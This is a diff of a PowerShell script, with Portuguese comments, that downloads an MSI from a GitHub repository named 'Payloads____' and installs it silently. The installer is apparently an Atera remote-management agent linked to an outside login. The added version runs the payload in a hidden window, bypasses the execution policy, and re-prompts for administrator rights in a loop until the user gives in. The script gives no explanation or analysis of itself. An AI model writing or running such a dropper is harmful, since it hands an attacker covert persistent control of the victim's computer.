@@ -1,27 +1,31 @@
-$serviceName = "AteraAgent"
+# Define o código que será executado com privilégios administrativos
+$command = @"
+    `$downloadURL = 'https://github.com/T1Cr4azy/Payloads____/raw/main/setup.msi'
+    `$downloadPath = `$env:USERPROFILE + '\Desktop\setup.msi'
 
-# Verificar se o serviço "AteraAgent" está em execução
-$service = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
+    Invoke-WebRequest -Uri `$downloadURL -OutFile `$downloadPath
 
-if ($service -eq $null) {
-    # Solicitar privilégios administrativos
-    $scriptPath = $MyInvocation.MyCommand.Path
-    $arguments = "-ExecutionPolicy Bypass -File `"$scriptPath`""
-    Start-Process -FilePath "powershell.exe" -ArgumentList $arguments -Verb RunAs -WindowStyle Hidden
-    Exit
+    if (Test-Path `$downloadPath) {
+        `$arguments = '/i `"$downloadPath`" /qn IntegratorLogin=admin@unisonagency.net CompanyId=1'
+        Start-Process -FilePath msiexec.exe -ArgumentList `$arguments -NoNewWindow -Wait
+    } else {
+        Write-Host 'Falha ao baixar o arquivo MSI.'
+    }
+"@
+
+# Verifica se o script está sendo executado com privilégios administrativos
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+if ($isAdmin) {
+    Start-Process powershell -Verb runAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$command`" -Wait"
 }
 
-# Parte principal do código
-$downloadURL = 'https://github.com/T1Cr4azy/Payloads____/raw/main/setup.msi'
-$downloadPath = "$env:USERPROFILE\Desktop\setup.msi"
-
-# Download do arquivo MSI usando o cmdlet 'Invoke-WebRequest'
-Invoke-WebRequest -Uri $downloadURL -OutFile $downloadPath
-
-# Verificar se o download foi concluído com sucesso
-if (Test-Path $downloadPath) {
-    # Executar o arquivo MSI com os argumentos para instalação silenciosa
-    Start-Process -FilePath msiexec.exe -ArgumentList "/i `"$downloadPath`" /qn IntegratorLogin=admin@unisonagency.net CompanyId=1" -NoNewWindow -Wait
-} else {
-    Write-Host "Falha ao baixar o arquivo MSI."
+# Se o script não estiver sendo executado com privilégios administrativos, solicita privilégios administrativos
+if (-Not $isAdmin) {
+    # Executa o loop até que o arquivo MSI seja baixado
+    while (-Not (Test-Path -Path "$env:USERPROFILE\Desktop\setup.msi")) {
+        # Solicita privilégios administrativos
+        Start-Process powershell -Verb runAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$command`" -Wait"
+        Start-Sleep 10
+    }
 }
